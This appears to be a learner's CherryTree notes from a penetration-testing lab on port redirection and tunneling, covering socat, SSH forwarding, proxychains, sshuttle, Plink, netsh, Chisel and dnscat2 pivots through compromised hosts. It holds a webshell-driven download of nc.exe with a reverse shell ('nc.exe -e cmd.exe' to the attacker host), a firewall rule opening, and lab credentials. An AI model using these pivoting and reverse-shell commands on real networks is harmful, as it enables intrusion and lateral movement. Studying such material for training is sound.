<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Port Redirection and Tunneling</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Port Redirection and Tunneling</h1><br/><p><h3>### Port Forwarding with socat</h3></p><p>On CONFLUENCE01, we&#39;ll start a verbose (-ddd) Socat process. It</p><p>will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new</p><p>subprocess when it receives a connection (fork) instead of dying</p><p>after a single connection, then forward all traffic it receives to TCP</p><p>port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432)</p><p><div class="codebox"><pre>CONFLUENCE01$ socat -ddd TCP-LISTEN<span style="color:#ff9d00;font-weight:700">:</span>2345,fork TCP<span style="color:#ff9d00;font-weight:700">:</span>10.4.50.215<span style="color:#ff9d00;font-weight:700">:</span>5432<br /><br />kali$ psql -h 192.168.50.63 2345 -U postgres</pre></div></p><p></p><p></p><p><h3>### SSH port forwarding</h3></p><p><div class="codebox"><pre>confluence$ python3 -c <span style="color:#3ad900;font-weight:400">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> database_admin@10.4.50.215<br /><br /><span style="color:#0088ff;font-weight:400"># in db01 check for open smb hosts</span><br />database_admin@pgdatabase01<span style="color:#ff9d00;font-weight:700">:</span>~$ <br />	<span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#7f0044;font-weight:400">i</span> <span style="color:#ff9d00;font-weight:700">in</span> $<span style="color:#ff9d00;font-weight:700">(seq</span> 1 254<span style="color:#ff9d00;font-weight:700">);</span> <span style="color:#ff9d00;font-weight:700">do</span> nc -zv -w 1 172.16.50.<span style="color:#7f0044;font-weight:400">$i</span> 445<span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#ff9d00;font-weight:700">done;</span><br /><span style="color:#0088ff;font-weight:400">#found 172.16.50.217:445</span><br /><br /><span style="color:#0088ff;font-weight:400"># local port forwarding with SSH</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> -N -L 0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>4455<span style="color:#ff9d00;font-weight:700">:</span>172.16.50.217<span style="color:#ff9d00;font-weight:700">:</span>445 database_admin@10.4.50.215<br /><span style="color:#0088ff;font-weight:400">#netmap</span><br /><span style="color:#0088ff;font-weight:400"># kali &gt; confluence &gt; db01 &gt; smb.217</span><br /><br /><span style="color:#0088ff;font-weight:400"># now open another reverse shell in confluence, than list shares</span><br />kali$ smbclient -p 4455 -L <span style="color:#ff9d00;font-weight:700">//</span>192.168.50.63<span style="color:#ff9d00;font-weight:700">/</span> -U hr_admin --password=Welcome1234<br /><span style="color:#0088ff;font-weight:400"># than connect</span><br />smbclient -p 4455 <span style="color:#ff9d00;font-weight:700">//</span>192.168.50.63<span style="color:#ff9d00;font-weight:700">/</span>scripts -U hr_admin --password=Welcome1234</pre></div></p><p></p><p></p><p><h3>### SSH dynamic Port Forwarding and Proxychains</h3></p><p><div class="codebox"><pre>confluence@confluence01<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>atlassian<span style="color:#ff9d00;font-weight:700">/</span>confluence<span style="color:#ff9d00;font-weight:700">/</span>bin$ <br />	<span style="color:#ff9d00;font-weight:700">ssh</span> -N -D 0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>9999 database_admin@10.4.50.215<br /><br />kali$ <span style="color:#ff9d00;font-weight:700">tail</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>proxychains4.conf <br /><span style="color:#0088ff;font-weight:400"># socks5 192.168.50.63 9999</span><br /><br />proxychains smbclient -L <span style="color:#ff9d00;font-weight:700">//</span>172.16.50.217<span style="color:#ff9d00;font-weight:700">/</span> -U hr_admin --password=Welcome1234<br />proxychains nmap -VVV -sT --top-ports=20 -Pn 172.16.50.217</pre></div></p><p></p><p></p><p><h3>### SSH Remote Port Forwarding</h3></p><p>same setup but confluence can only listen on TCP/8090 for firewall rules</p><p>so we leverage the ssh client of confluence as the outbound ports are not blocked.</p><p></p><p><div class="codebox"><pre>confluence@confluence01<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>atlassian<span style="color:#ff9d00;font-weight:700">/</span>confluence<span style="color:#ff9d00;font-weight:700">/</span>bin$ <br />	<span style="color:#ff9d00;font-weight:700">ssh</span> -N -R 127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>2345<span style="color:#ff9d00;font-weight:700">:</span>10.4.50.215<span style="color:#ff9d00;font-weight:700">:</span>5432 kali@192.168.118.4<br /><span style="color:#0088ff;font-weight:400"># 127.0.0.1:2345 is the listening remote socket (in kali connection)</span><br /><span style="color:#0088ff;font-weight:400"># other is forwarding socket</span><br /><br />kali$ psql -h 127.0.0.1 2345 -U postgres</pre></div></p><p>now all traffic that goes in 127.0.0.1:2345 will do this route</p><p>127.0.0.1:2345 -&gt; ssh client confluence -&gt; forwarding 10.4.50.215</p><p></p><p></p><p><h3>### SSH dynamic remote port forwarding</h3></p><p><div class="codebox"><pre>confluence01$ <span style="color:#ff9d00;font-weight:700">ssh</span> -N -R 9998 kali@192.168.118.4<br /><span style="color:#0088ff;font-weight:400">#check enstablished connections</span><br />ss -ntplu<br /><br />kali$ <span style="color:#ff9d00;font-weight:700">tail</span> proxychains4.conf<br /><span style="color:#0088ff;font-weight:400"># socks5 127.0.0.1 9998</span><br /><br />kali$ proxychains nmap 10.4.50.64</pre></div></p><p></p><p></p><p><h3>### SSHuttle</h3></p><p>sshuttle is a tool that turns an SSH connection into something similar to a VPN by</p><p>setting up local routes that force traffic through the SSH tunnel</p><p>	it requires root privileges on the SSH client and Python3 on the SSH server</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># setup tunneling</span><br />confluence@confluence01<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>atlassian<span style="color:#ff9d00;font-weight:700">/</span>confluence<span style="color:#ff9d00;font-weight:700">/</span>bin$ <br />	socat TCP-LISTEN<span style="color:#ff9d00;font-weight:700">:</span>2222,fork TCP<span style="color:#ff9d00;font-weight:700">:</span>10.4.50.215<span style="color:#ff9d00;font-weight:700">:</span>22<br /><br />kaliakali<span style="color:#ff9d00;font-weight:700">:</span>~$ sshuttle -r database_admin@192.168.50.63<span style="color:#ff9d00;font-weight:700">:</span>2222 10.4.50.0<span style="color:#ff9d00;font-weight:700">/</span>24 172.16.50.0<span style="color:#ff9d00;font-weight:700">/</span>24<br /><br />kaliakali<span style="color:#ff9d00;font-weight:700">:</span>~$ smbclient -L <span style="color:#ff9d00;font-weight:700">//</span>172.16.50.217<span style="color:#ff9d00;font-weight:700">/</span> -U hr_admin --password=Welcome1234</pre></div></p><p></p><p></p><p><h3>### ssh.exe</h3></p><p><div class="codebox"><pre>confluence01RDP<span style="color:#333333;font-weight:400">\&gt;</span> where <span style="color:#ff9d00;font-weight:700">ssh</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> -N -R 9998 kali@192.168.118.4<br /><br />kali$ <span style="color:#ff9d00;font-weight:700">tail</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>proxychains4.conf <br /><span style="color:#0088ff;font-weight:400"># socks5 127.0.0.1 9998 </span><br /><br />kali$ proxychains psql -h 10.4.50.215 -U postgres</pre></div></p><p></p><p></p><p><h3>### Plink</h3></p><p>when ssh is not present</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># 1 upload webshell and make that pc download nc.exe from our kali host</span><br />kali$ <span style="color:#ff9d00;font-weight:700">sudo</span> system<br />kali$ <span style="color:#ff9d00;font-weight:700">sudo</span> <span style="color:#ff9d00;font-weight:700">cp</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>windows-resources<span style="color:#ff9d00;font-weight:700">/</span>binaries<span style="color:#ff9d00;font-weight:700">/</span>nc.exe <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<br /><br />webshell&gt; powershell <span style="color:#ff9d00;font-weight:700">wget</span> -Uri http<span style="color:#ff9d00;font-weight:700">://</span>192.168.118.4<span style="color:#ff9d00;font-weight:700">/</span>nc.exe <br />	-OutFile C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\T</span>emp<span style="color:#333333;font-weight:400">\n</span>c.exe<br /><br />webshell&gt; C<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\T</span>emp<span style="color:#333333;font-weight:400">\n</span>c.exe -e cmd.exe 192.168.118.4 4446<br /><span style="color:#0088ff;font-weight:400"># same process to download plink.exe in the webshell host</span><br /><br />webshell&gt; C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\T</span>emp<span style="color:#333333;font-weight:400">\p</span>link.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; <br />	-R 127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>9833<span style="color:#ff9d00;font-weight:700">:</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>3389 192.168.118.4<br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>rdp_admin <span style="color:#ff9d00;font-weight:700">/</span>p<span style="color:#ff9d00;font-weight:700">:</span> Password<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>9833</pre></div></p><p></p><p></p><p><h3>### netsh</h3></p><p>when Windows is the host that acts as proxy</p><p>but inbound traffic is not allowed</p><p>but we have admin shell on this windows host</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># connect rdp</span><br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32&gt; netsh interface portproxy add v4tov4 <br />	<span style="color:#7f0044;font-weight:400">listenport</span>=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215<br /><br />netstat -anp TCP <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#3ad900;font-weight:400">&quot;2222&quot;</span><br />netsh interface portproxy show all<br /><br /><span style="color:#0088ff;font-weight:400"># We can use the netsh advfirewall firewall subcontext to create the hole</span><br />netsh advfirewall firewall add rule name=<span style="color:#3ad900;font-weight:400">&quot;port_forward_ssh_2222&quot;</span> <br />	<span style="color:#7f0044;font-weight:400">protocol</span>=TCP <span style="color:#ff9d00;font-weight:700">dir</span>=in localip=192.168.50.64 localport=2222 action=allow<br /><br /><span style="color:#0088ff;font-weight:400">#to remove</span><br />netsh advfirewall firewall delete rule name=<span style="color:#3ad900;font-weight:400">&quot;port_forward_ssh _2222&quot;</span><br /><br />netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64<br /></pre></div></p><p></p><p></p><p><h3>### HTTP Tunneling </h3></p><p>scenario:</p><p>confluence has 8090 inbound only, outbound blocked except for http</p><p></p><p>tool: </p><p>Chisel -&gt; encapsulate traffic through http tunneling </p><p><div class="codebox"><pre>kali$ chiser server -port 8080 --reverse<br /><br />victim$ <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>chisel client 192.168.118.4<span style="color:#ff9d00;font-weight:700">:</span>8080 R<span style="color:#ff9d00;font-weight:700">:</span>socks &gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">&amp;</span> <br /><br /><span style="color:#0088ff;font-weight:400">#Now we&#39;ll pass an Ncat command to ProxyCommand</span><br />kali$ <span style="color:#ff9d00;font-weight:700">ssh</span> -o ProxyCommand=<span style="color:#3ad900;font-weight:400">&#39;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#39;</span> <br />	database_admin@10.4.50.215</pre></div></p><p></p><p></p><p><h3>### DNS Tunneling</h3></p><p>how to perform DNS tunneling with a tool called dnscat2</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#  we need to initiate DNS requests from PGDATABASE01,</span><br /><span style="color:#0088ff;font-weight:400"># and monitor what comes in to FELINEAUTHORITY</span><br /><br />felineauthority<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> dns_tunneling<br /><span style="color:#ff9d00;font-weight:700">cat</span> dnsmasq.conf<br />	<span style="color:#0088ff;font-weight:400"># Define the zone</span><br />	auth-zone=feline.corp<br />	auth-server=feline.corp<br /><br /><span style="color:#ff9d00;font-weight:700">sudo</span> dnsmasq -C dnsmasq.conf -d<br /><br />pgdatabase01<span style="color:#ff9d00;font-weight:700">:</span>~$ resolvectl status<br />nslookup exfiltrated-data.feline.corp<br /><br />felineauthority<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> dnsmasq_txt.conf<br />	<span style="color:#0088ff;font-weight:400"># Define the zone</span><br />	auth-zone=feline.corp<br />	auth-server=feline.corp<br /><br />	<span style="color:#0088ff;font-weight:400"># TXT record</span><br />	txt-record=www.feline.corp,here<span style="color:#3ad900;font-weight:400">&#39;s something useful!<br />	txt-record=www.feline.corp,here&#39;</span>s something <span style="color:#ff9d00;font-weight:700">else</span> <span style="color:#ff9d00;font-weight:700">less</span> useful.<br /><br /><span style="color:#ff9d00;font-weight:700">sudo</span> dnsmasq -C dnsmasq_txt.conf -d<br /><br />pgdatabase01<span style="color:#ff9d00;font-weight:700">:</span>~$ nslookup -type=txt www.feline.corp<br /><br /><span style="color:#0088ff;font-weight:400">## start server</span><br />felineauthority<span style="color:#ff9d00;font-weight:700">:</span>~$ dnscat2-server feline.corp<br /><br /><span style="color:#0088ff;font-weight:400">## connect client</span><br />pgdatabase01<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>dnscat$ .<span style="color:#ff9d00;font-weight:700">/</span>dnscat feline.corp<br /><br /><span style="color:#0088ff;font-weight:400">## interactive</span><br />felineauthority<span style="color:#ff9d00;font-weight:700">:</span>~$ dnscat2&gt; windows<br />windows -i 1<br />listen 127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>4455 172.16.50.217<span style="color:#ff9d00;font-weight:700">:</span>445<br />smbclient -p 4455 -L <span style="color:#ff9d00;font-weight:700">//</span>127.0.0.1 -U hr_admin --password=Welcome123<br /></pre></div></p></div>
</body>
</html>
